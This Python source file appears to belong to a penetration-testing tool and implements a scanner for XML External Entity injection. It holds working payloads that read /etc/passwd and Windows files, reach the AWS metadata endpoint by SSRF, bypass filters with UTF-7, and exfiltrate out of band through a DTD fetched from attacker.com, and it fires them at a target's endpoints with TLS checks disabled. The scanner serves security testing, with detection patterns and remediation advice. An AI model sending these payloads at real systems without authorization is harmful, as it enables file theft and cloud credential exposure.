"""
Jarwis AGI Pen Test - XXE (XML External Entity) Injection Scanner
Detects XXE vulnerabilities (A03:2021 - Injection)
Based on Web Hacking 101 techniques - adapted for 2025
"""

import asyncio
import logging
import re
from typing import Dict, List, Optional
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin
import aiohttp
import ssl

logger = logging.getLogger(__name__)


@dataclass
class ScanResult:
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe_id: str = ""
    poc: str = ""
    reasoning: str = ""
    request_data: str = ""
    response_data: str = ""


class XXEScanner:
    """
    Scans for XML External Entity (XXE) Injection vulnerabilities
    OWASP A03:2021 - Injection
    CWE-611: Improper Restriction of XML External Entity Reference
    
    Attack vectors:
    - Local file disclosure
    - SSRF via XXE
    - Denial of Service (Billion Laughs)
    - Remote code execution (rare)
    - Port scanning
    - Data exfiltration
    """
    
    # XXE Payloads for different scenarios
    XXE_PAYLOADS = {
        # Classic file read (Linux)
        'file_linux': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>''',

        # Classic file read (Windows)
        'file_windows': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
]>
<root><data>&xxe;</data></root>''',

        # SSRF via XXE
        'ssrf_localhost': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<root><data>&xxe;</data></root>''',

        # SSRF to AWS metadata
        'ssrf_aws': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>''',

        # PHP filter wrapper (base64 encode file)
        'php_filter': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root><data>&xxe;</data></root>''',

        # Parameter entity for OOB exfiltration
        'oob_exfil': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
<root><data>test</data></root>''',

        # Blind XXE with error-based exfiltration  
        'blind_error': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root><data>test</data></root>''',

        # XInclude attack (when you can't control DOCTYPE)
        'xinclude': '''<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>''',

        # SVG XXE
        'svg_xxe': '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>''',

        # SOAP XXE
        'soap_xxe': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>''',

        # RSS/Atom XXE
        'rss_xxe': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
  </channel>
</rss>''',

        # UTF-7 encoded XXE (bypass some WAFs)
        'utf7_xxe': '''<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo +AFs-
  +ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AF0-+AD4-
+ADw-root+AD4-+ADw-data+AD4-+ACY-xxe+ADs-+ADw-/data+AD4-+ADw-/root+AD4-''',

        # Basic entity test
        'entity_test': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxetest "JARWIS_XXE_DETECTED">
]>
<root><data>&xxetest;</data></root>''',
    }
    
    # Indicators of successful XXE
    XXE_INDICATORS = {
        'file_linux': [
            r'root:.*:0:0:',
            r'daemon:.*:1:1:',
            r'/bin/bash',
            r'/bin/sh',
        ],
        'file_windows': [
            r'localhost',
            r'127\.0\.0\.1',
            r'# Copyright',
        ],
        'ssrf': [
            r'<!DOCTYPE',
            r'<html',
            r'HTTP/1\.',
            r'Apache',
            r'nginx',
        ],
        'aws_metadata': [
            r'ami-id',
            r'instance-id',
            r'local-hostname',
            r'placement',
        ],
        'entity_test': [
            r'JARWIS_XXE_DETECTED',
        ],
    }
    
    # Endpoints likely to accept XML
    XML_ENDPOINTS = [
        '/api', '/api/v1', '/api/v2', '/soap', '/wsdl',
        '/xml', '/xmlrpc', '/rpc', '/service', '/services',
        '/upload', '/import', '/parse', '/process',
        '/rss', '/feed', '/atom', '/sitemap',
        '/saml', '/sso', '/auth', '/login',
        '/config', '/settings', '/data', '/export',
        '/webhook', '/callback', '/notify',
    ]
    
    # Content types that accept XML
    XML_CONTENT_TYPES = [
        'application/xml',
        'text/xml',
        'application/xhtml+xml',
        'application/soap+xml',
        'application/rss+xml',
        'application/atom+xml',
        'image/svg+xml',
        'application/x-www-form-urlencoded',  # Sometimes converted to XML
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.browser = None
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting XXE vulnerability scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        # Collect endpoints
        urls_to_test = set()
        
        for endpoint in self.XML_ENDPOINTS:
            urls_to_test.add(urljoin(base_url, endpoint))
        
        if hasattr(self.context, 'endpoints'):
            for endpoint in self.context.endpoints[:50]:
                url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                method = endpoint.get('method', 'GET') if isinstance(endpoint, dict) else 'GET'
                
                # Focus on POST endpoints and API endpoints
                if url and (method == 'POST' or '/api' in url.lower()):
                    urls_to_test.add(url)
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            for url in urls_to_test:
                try:
                    await asyncio.sleep(1 / self.rate_limit)
                    await self._test_xxe(session, url)
                except Exception as e:
                    logger.debug(f"Error testing {url}: {e}")
        
        logger.info(f"XXE scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _test_xxe(self, session: aiohttp.ClientSession, url: str):
        """Test endpoint for XXE vulnerabilities"""
        
        # Test with different content types
        for content_type in ['application/xml', 'text/xml']:
            for payload_name, payload in self.XXE_PAYLOADS.items():
                try:
                    headers = {
                        'Content-Type': content_type,
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                        'Accept': '*/*',
                    }
                    
                    async with session.post(url, data=payload, headers=headers) as response:
                        status = response.status
                        body = await response.text()
                        
                        # Check for XXE indicators
                        vuln_found = False
                        evidence = ""
                        severity = "high"
                        
                        # Check entity test first (safest)
                        if payload_name == 'entity_test':
                            if 'JARWIS_XXE_DETECTED' in body:
                                vuln_found = True
                                evidence = "Custom entity was processed"
                                severity = "high"
                        
                        # Check file read indicators
                        elif payload_name in ['file_linux', 'php_filter']:
                            for pattern in self.XXE_INDICATORS['file_linux']:
                                if re.search(pattern, body):
                                    vuln_found = True
                                    evidence = f"File content leaked: {pattern}"
                                    severity = "critical"
                                    break
                        
                        elif payload_name == 'file_windows':
                            for pattern in self.XXE_INDICATORS['file_windows']:
                                if re.search(pattern, body):
                                    vuln_found = True
                                    evidence = f"Windows file content leaked: {pattern}"
                                    severity = "critical"
                                    break
                        
                        # Check SSRF indicators
                        elif 'ssrf' in payload_name:
                            for pattern in self.XXE_INDICATORS['ssrf']:
                                if re.search(pattern, body, re.IGNORECASE):
                                    vuln_found = True
                                    evidence = f"SSRF via XXE detected"
                                    severity = "high"
                                    break
                        
                        # Check AWS metadata
                        elif payload_name == 'ssrf_aws':
                            for pattern in self.XXE_INDICATORS['aws_metadata']:
                                if re.search(pattern, body):
                                    vuln_found = True
                                    evidence = f"AWS metadata accessed via XXE"
                                    severity = "critical"
                                    break
                        
                        # Check for XML parsing errors that indicate entity processing
                        error_patterns = [
                            r'failed to open',
                            r'entity.*not found',
                            r'undefined entity',
                            r'DTD.*not permitted',
                            r'external entity',
                        ]
                        for pattern in error_patterns:
                            if re.search(pattern, body, re.IGNORECASE):
                                result = ScanResult(
                                    id=f"XXE-INFO-{len(self.results)+1}",
                                    category="A03:2021 - Injection",
                                    severity="info",
                                    title=f"XML Parser Entity Processing Detected",
                                    description="The XML parser attempts to process external entities, but blocked or errored. May be exploitable with different payload.",
                                    url=url,
                                    method="POST",
                                    evidence=f"Parser error: {pattern}",
                                    remediation="Disable DTD processing and external entities.",
                                    cwe_id="CWE-611",
                                    poc=f"curl -X POST -H 'Content-Type: {content_type}' -d '{payload[:100]}...' '{url}'"
                                )
                                self.results.append(result)
                                break
                        
                        if vuln_found:
                            result = ScanResult(
                                id=f"XXE-{len(self.results)+1}",
                                category="A03:2021 - Injection",
                                severity=severity,
                                title=f"XML External Entity (XXE) Injection - {payload_name}",
                                description=f"The application processes XML with external entity expansion, allowing file disclosure, SSRF, or denial of service.",
                                url=url,
                                method="POST",
                                parameter="XML Body",
                                evidence=evidence,
                                remediation="Disable DTDs (DOCTYPE declarations) completely. Disable external entity and parameter entity processing. Use less complex data formats like JSON if possible.",
                                cwe_id="CWE-611",
                                poc=f"curl -X POST -H 'Content-Type: {content_type}' -d @xxe_payload.xml '{url}'",
                                reasoning=f"XXE payload '{payload_name}' successfully processed",
                                request_data=payload[:500],
                                response_data=body[:500]
                            )
                            self.results.append(result)
                            logger.info(f"Found XXE: {payload_name} on {url}")
                            return  # Found on this endpoint
                        
                except asyncio.TimeoutError:
                    # Timeout might indicate entity processing
                    pass
                except Exception as e:
                    logger.debug(f"XXE test error: {e}")
    
    async def _test_xxe_in_file_upload(self, session: aiohttp.ClientSession, url: str):
        """Test for XXE in file upload (SVG, DOCX, etc.)"""
        
        # Test SVG upload
        svg_payload = self.XXE_PAYLOADS['svg_xxe']
        
        form = aiohttp.FormData()
        form.add_field('file',
                       svg_payload,
                       filename='test.svg',
                       content_type='image/svg+xml')
        
        try:
            async with session.post(url, data=form) as response:
                body = await response.text()
                
                # Check for file content in response
                for pattern in self.XXE_INDICATORS['file_linux']:
                    if re.search(pattern, body):
                        result = ScanResult(
                            id=f"XXE-SVG-{len(self.results)+1}",
                            category="A03:2021 - Injection",
                            severity="critical",
                            title="XXE via SVG File Upload",
                            description="The application processes SVG files with external entity expansion during upload.",
                            url=url,
                            method="POST",
                            parameter="file upload",
                            evidence=f"File content leaked in SVG processing",
                            remediation="Sanitize SVG uploads. Remove DOCTYPE and entity declarations.",
                            cwe_id="CWE-611",
                        )
                        self.results.append(result)
                        return
                        
        except Exception as e:
            logger.debug(f"SVG XXE test error: {e}")
